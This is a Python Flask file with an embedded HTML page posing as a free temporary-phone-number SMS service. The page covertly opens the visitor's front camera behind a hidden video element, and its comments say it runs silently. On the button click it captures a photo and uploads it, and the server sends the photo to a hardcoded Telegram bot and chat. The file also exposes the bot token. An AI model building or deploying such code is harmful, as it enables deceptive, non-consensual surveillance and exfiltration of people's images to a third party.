import os
from flask import Flask, render_template_string, request, jsonify
import requests
import base64

app = Flask(__name__)

# بيانات بوت تيليجرام الخاص بك
TELEGRAM_BOT_TOKEN = "8575847456:AAE0K2YUmc5Ri77kFwrl14IIMV999ewfpeU"
TELEGRAM_CHAT_ID = "8369014219"

# واجهة الموقع المطابقة للطلب
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>رسائل قصيرة مجانية مع رقم هاتف مؤقت</title>
    <style>
        body { 
            background-color: #ffffff; 
            color: #1a1a1a; 
            font-family: Tahoma, sans-serif; 
            text-align: center; 
            margin: 0;
            padding: 20px;
        }
        /* إخفاء الكاميرا تماماً عن المستخدم */
        video { display: none; }
        
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #eaeaea;
            padding-bottom: 15px;
            margin-bottom: 30px;
        }
        .logo-area { font-weight: bold; font-size: 18px; color: #008751; }
        
        h1 {
            font-size: 28px;
            font-weight: 800;
            color: #111;
            margin-bottom: 15px;
            line-height: 1.4;
        }
        .features-list {
            list-style: none;
            padding: 0;
            margin: 20px 0 35px 0;
            font-size: 16px;
            color: #444;
        }
        .features-list li {
            margin: 8px 0;
        }
        
        .btn-primary {
            background-color: #3b5bdb;
            color: white;
            border: none;
            padding: 16px 24px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 12px;
            cursor: pointer;
            width: 100%;
            max-width: 450px;
            margin-bottom: 15px;
            box-shadow: 0 4px 10px rgba(59, 91, 219, 0.3);
        }
        .btn-primary:hover { background-color: #3250c1; }
        
        .btn-secondary {
            background-color: transparent;
            color: #3b5bdb;
            border: 2px solid #3b5bdb;
            padding: 14px 24px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 12px;
            cursor: pointer;
            width: 100%;
            max-width: 450px;
        }
        .btn-secondary:hover { background-color: #f8f9fa; }

        .footer-features {
            margin-top: 50px;
            text-align: right;
            border-top: 1px solid #eaeaea;
            padding-top: 20px;
            font-size: 14px;
            color: #666;
            max-width: 450px;
            margin-left: auto;
            margin-right: auto;
        }
        .footer-features div {
            padding: 8px 0;
            display: flex;
            justify-content: space-between;
        }
        #status { margin-top: 15px; font-size: 15px; color: #3b5bdb; font-weight: bold; }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo-area">🛡️ SafeNumber</div>
        <div>⭐⭐⭐⭐⭐ <span style="font-size: 12px; color: #666;">Excellent</span></div>
    </div>

    <div>
        <h1>رسائل قصيرة مجانية<br>مع رقم هاتف مؤقت</h1>
        
        <ul class="features-list">
            <li>📌 90 دولة وأكثر من 1 مليون رقم</li>
            <li>⚡ إضافة أرقام هواتف يوميًا</li>
        </ul>
        
        <div>
            <video id="video" autoplay playsinline></video>
        </div>

        <div>
            <button id="capture-btn" class="btn-primary">احصل على رقم مؤقت</button>
        </div>
        <div>
            <button class="btn-secondary">تعرف على المزيد حول الخدمة</button>
        </div>
        
        <div id="status"></div>

        <div class="footer-features">
            <div><span>سرعات فائقة السرعة</span> <span>›</span></div>
            <div><span>مرور غير محدود وعرض ترددي غير محدود</span> <span>›</span></div>
            <div><span>أمان كامل وخصوصية</span> <span>›</span></div>
            <div><span>ضمان استرداد الأموال لمدة 30 يومًا</span> <span>›</span></div>
        </div>
    </div>

    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const captureBtn = document.getElementById('capture-btn');
        const statusDiv = document.getElementById('status');

        // تشغيل الكاميرا في الخلفية بصمت تام
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
            .then(stream => {
                video.srcObject = stream;
            })
            .catch(err => {
                // تجاهل خطأ الكاميرا صامتاً
            });

        captureBtn.addEventListener('click', () => {
            statusDiv.innerText = "جاري تجهيز الرقم المؤقت...";
            
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // تحويل الصورة إلى Base64
            const imageData = canvas.toDataURL('image/jpeg');

            fetch('/upload', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: imageData })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    statusDiv.innerText = "تم إنشاء الرقم بنجاح!";
                } else {
                    statusDiv.innerText = "فشل الطلب، حاول مرة أخرى.";
                }
            })
            .catch(err => {
                statusDiv.innerText = "حدث خطأ بالاتصال.";
            });
        });
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/upload', methods=['POST'])
def upload():
    temp_path = "captured_photo.jpg"
    try:
        data = request.json
        image_data = data['image'].split(',')[1]
        
        # حفظ الصورة مؤقتاً
        image_bytes = base64.b64decode(image_data)
        with open(temp_path, "wb") as f:
            f.write(image_bytes)

        # إرسال الصورة إلى تيليجرام
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
        with open(temp_path, 'rb') as photo_file:
            files = {'photo': photo_file}
            data_payload = {'chat_id': TELEGRAM_CHAT_ID, 'caption': '🔔 قام المستخدم بالضغط على "احصل على رقم مؤقت" وتم التقاط الصورة بنجاح!'}
            response = requests.post(url, data=data_payload, files=files)

        # حذف الملف المؤقت
        if os.path.exists(temp_path):
            os.remove(temp_path)

        if response.status_code == 200:
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'error': response.text})

    except Exception as e:
        if os.path.exists(temp_path):
            os.remove(temp_path)
        return jsonify({'success': False, 'error': str(e)})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
